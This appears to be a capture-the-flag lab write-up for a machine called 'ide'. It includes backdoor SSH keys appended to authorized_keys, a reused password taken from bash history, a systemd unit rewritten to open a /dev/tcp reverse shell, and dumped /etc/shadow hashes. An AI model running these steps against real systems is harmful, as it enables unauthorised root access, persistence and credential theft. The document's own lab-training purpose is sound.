### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDQHdSp5UyJHMnjls6MksSCC6X1ukRGCc9d4KB4MM03mQ3FG5jurZ8o9rzRYeNCeM83MOvqxNJKmvbJ97HLAysCRXQhdQxZdXByIa0huiWJn3uDfYxnthm+Stq4HeVlUua9UdwDT/2aAKCbPARDjtyhj9TMsci4TuDP13Jr+py24XIJK85PsUceyDHHmzZyqVxVk6LQe/OG/vgfLV6cAukLgylYUIW1rHAdjmdGXO5OT8MtkfR90oleYVmgR/p7YIeWuIdvV+eush7uQXeGk1FH13i/ZL6R54s2yXytoVHj/tJsQl2isI+GZpGP816qn/SQNYnxTGSPx8KpIC/Fm6wUKdLqdBXX3HwkO46dCRZEtLcfdvVZQGzBorqDsJWm9vzy+U+UE9UtclW1JL2WCtXT6nWB/U2w8qnmqYECcGI88F9vEhJggdmsdISOUYIOjiShbuAgOO/pWBAfacefDSanus2kIPErbVOdUu95yDrp7Es6DsUTYmkxzTgqWgzUrGj5xUYL36dnaBluFwBcQ23ScT74JbTqL+C46S5el3VNJKfdeNlboS/tq0dRWr2Tmd/xgn3ODkPMpWMxFpduHdDe2Nty9FNnkCJHNRjeG994ruXkq98XEzec/O2XWeFINjRVES7tLJb/JsqHAawrtAO8Pgr8sA9a7PdScOx4goX6Pw== your_email@example.com" >> /home/drac/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCZkKJUKB8cGBTcBibDvjygltq1hEMVAXPnhBUkmx0oA4Jbr0jz2fqtmgnwd+ZohciH3NaQi0LhCkBriifNkONMpEgyCzB5uRB8EyMP5BjRGyo6kuCAuVqPQ67nmyIRRZsDbh21do5IOUENGCyd63giFeW2nKhNIjfRrxO3LOS0rbWQhbrsyCQzCtmWFvQu886jE2qCggs0T5BrHmBGT2okNSQEjufN7Zs0szdNwWr0uJCUi5ktwy31NVf00MI/pDcl+On3TA7/LxATy2HbXMXp4eDtyClVGFNwwEphXsizgAGc5RCh+8OI4dmiTctxZqVAoaVuAvQyZmF2afiKLp0PYeep5k6OAFg2bDWgNWGsvhV1+4hycxZgmzTT+KARkJbrmO1CnvcYRQwO/wbOF+KprgLQ3VIOHfbQE2Nd9TTKv6eppZjstv2mDfMkgoRN/utLSo6DTtDRtw5CH/vF2hZrz62k+doB3m11oR5BkoTHHT83EkVUbIeosW63Wzio41GDFQMbH/REtEm2bhBpd878jAylyORCrRa+RuPAaqc+twJhjyqq/dkAKkyJMnbZL6yRECyAe5R9GH6lainauSgO+2EJr+wK60jHFa3TYJ606iFgP1cMgcsf4fcrEkSepVojLh9TUdt3e+ysd5k4ZWSK5Zl8JkN73gr8T6enWnH1SQ== your_email@example.com" >> /root/.ssh/authorized_keys
```


upgrade to a tty

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

there is a drac user in /home

```
www-data@ide:/home$ ls -la /home/
ls -la /home/
total 12
drwxr-xr-x  3 root root 4096 Jun 17  2021 .
drwxr-xr-x 24 root root 4096 Jul  9  2021 ..
drwxr-xr-x  6 drac drac 4096 Aug  4  2021 drac
```

we see a mysql login in drac's bash history

```
cat /home/drac/.bash_history
```

```
cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

running it does not work

```
www-data@ide:/home/drac$ mysql -u drac -p 'Th3dRaCULa1sR3aL'
mysql -u drac -p 'Th3dRaCULa1sR3aL'

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7   
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.

www-data@ide:/home/drac$
```

trying the mysql password to change user to the draq user works

```
www-data@ide:/home/drac$ su drac
su drac
Password: Th3dRaCULa1sR3aL

drac@ide:~$
```

/home/drac/user.txt

```
02930d21a8eb009f6d26361b2d24a466
```

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
drac:x:1000:1000:drac:/home/drac:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```
drac@ide:/var/www/html/codiad$ sudo -l
[sudo] password for drac: 
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

```
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/vsftpd.service

```

the file is owned by root but we can read and write

```
lrwxrwxrwx 1 root root 34 Jun 18  2021 /etc/systemd/system/multi-user.target.wants/vsftpd.service -> /lib/systemd/system/vsftpd.service
```

turnign the service malicious with a reverse shell

original service


```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

new service

```
nano /lib/systemd/system/vsftpd.service
```

```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'sh -i >& /dev/tcp/10.6.24.127/1341 0>&1'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

start a listener on attacker machine

```
nc -lvnp 1341
```

run the service with permissions

```
systemctl daemon-reload
Th3dRaCULa1sR3aL
sudo /usr/sbin/service vsftpd restart
```


the output

```
drac@ide:/var/www/html/codiad$ nano /etc/systemd/system/multi-user.target.wants/vsftpd.service
drac@ide:/var/www/html/codiad$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:/var/www/html/codiad$ sudo /usr/sbin/service vsftpd restart
```

we get our shell

```
listening on [any] 1341 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.239.154] 41766
sh: 0: can't access tty; job control turned off
# whoami
root
# uname -a
Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
# sudo -l
Matching Defaults entries for root on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on ide:
    (ALL : ALL) ALL
# 
```

/root/root.txt

```
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

/etc/shadow

```
root:$6$QYHRcZg0$Zrs3m3TUQLln2eDdTNmh8pMY747fLC6hsnQytI/zmMM4bEbD5xl5/W0QRZQ091LhUVSM.6lmbmg0BulIzFpXT.:18796:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18795:0:99999:7:::
drac:$6$1COGP750$zJinq4p1DzAfYuXHyUYA61g9b1pU/ThmHMuwvxXTwnmj41Y63FIG7pB7qCDcgjVE69RmzByG319npQS7/Rq.x1:18796:0:99999:7:::
ftp:*:18796:0:99999:7:::
```